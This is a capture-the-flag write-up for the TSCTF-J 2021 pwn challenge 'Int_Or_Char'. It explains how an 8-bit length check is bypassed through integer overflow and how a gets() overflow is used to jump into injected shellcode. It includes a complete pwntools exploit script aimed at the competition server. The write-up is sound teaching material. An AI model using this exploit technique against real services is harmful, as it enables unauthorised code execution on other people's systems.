---
title: "TSCTF-J_2021 Pwn - Int_Or_Char WriteUp"
date: 2021-10-30
tags: ["TSCTF-J_2021", "Pwn", "writeup", "wp"]
authors: [nova]
---

## Problem

### Preliminary Determination of Ideas

Using `checksec` to check the file, it is found that NX and PIE are not enabled, so consider ret2text and ret2shellcode preliminarily.

![checksec](https://oss.nova.gal/img/image-20211025175327904.png)

<!--truncate-->

### Code Analysis

Let's jump directly to the `pwn()` function.

```c
int pwn()
{
  char s[50]; // [esp+Dh] [ebp-3Bh] BYREF
  unsigned __int8 v2; // [esp+3Fh] [ebp-9h]

  puts("Plz input ur passwd:");
  puts("Tip: The passwd length needs to be between 4 and 8 characters");
  gets(s);
  v2 = strlen(s);
  return check(v2, s);
}
```

Noticing that `gets(s)` does not limit the length, a stack overflow could be exploited here.

Moving to the `check(v2, s)` function.

```c
char *__cdecl check(int a1, char *src)
{
  if ((unsigned __int8)a1 <= 3u || (unsigned __int8)a1 > 8u)
  {
    puts("So bad!");
    puts("The passwd length needs to be between 4 and 8 characters");
    exit(0);
  }
  puts("good length!");
  return strcpy(passwd_buf, src);
}
```

Here, we are required to have a length `a1 > 3 && a1 <= 8`. If so, we cannot construct the desired payload. In this case, we can refer to the write-up of [Int_Overflow](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5058&page=1) from Attacking & Defending World, which mentions an **integer overflow vulnerability**.

> A simple example in C language:
>
> For a `2-byte unsigned short int variable`, when its data length exceeds 2 bytes, it will overflow, and only the last two bytes of data will be used.
>
> ```c
> int main()
> {
> unsigned short int var1 = 1, var2 = 257;
> if (var1 == var2)
> {
> printf("overflow");
> }
> return 0;
> }
> ```
>
> ```shell
> Out:
> overflow
> ```

Returning to our problem, our `v2` is an `unsigned __int8` variable, meaning its value range is from `0 to 255`. If we pass a data length of _256_, the value of `v2` actually becomes _1_ (255 + 1), so the length we pass can be from _(255+4)_ to _(255+8)_, which is _259-263_ characters.

With the character length check bypassed, what should we do next to exploit this vulnerability?

```c
char *strcpy(char *dest, const char *src);
```

This is the prototype of `strcpy`, which means the content of `src` will be copied to the address of `dest`, that is, the location of `passwd_buf` in the problem.

We take a look at the stack here.

[Mark's explanation](https://oss.nova.gal/img/image-20211025192651649.png) from the image reveals that due to NX not being enabled, our buffer is **executable**, giving us the condition to use a `shellcode`. As we do not have any system call functions in place, we must craft our own shellcode.

```python
from pwn import *

context(os='linux', arch='i386', log_level='debug') # Specify the target as a 32-bit system

shellcode = asm(shellcraft.sh()) # Generate shellcode
buf_addr = 0x804A060 # Address of buf

payload = shellcode.ljust(0x3b, b'A') + b'A'*4 + p32(buf_addr) # Align shellcode to the bottom of the stack, add 4 bytes of data to overwrite rbp, then add p32(buf_addr) to jump to buf_addr for execution, which is our shellcode
payload = payload + b'A'*(262-len(payload)) # Pad the payload to exploit the integer overflow vulnerability

p = remote("45.82.79.42", 11001)

p.recvuntil("characters")
p.sendline(payload)
p.interactive()
# At this point, the shell is obtained, and the subsequent steps are self-explanatory
```

> The server had already been shutdown before the writing of this WriteUp, so the post-shell-taking process could not be demonstrated.

### Personal Summary

Though the implementation of the integer overflow was relatively quick, it took quite a while to figure out how to run the shellcode (due to the need to overwrite rbp after reaching the bottom of the stack, which I completely didn't understand before).

Pwn is indeed fascinating.

## References

[ret2shellcode](https://blog.csdn.net/qq_45691294/article/details/111387593)

Mark

<!-- AI -->
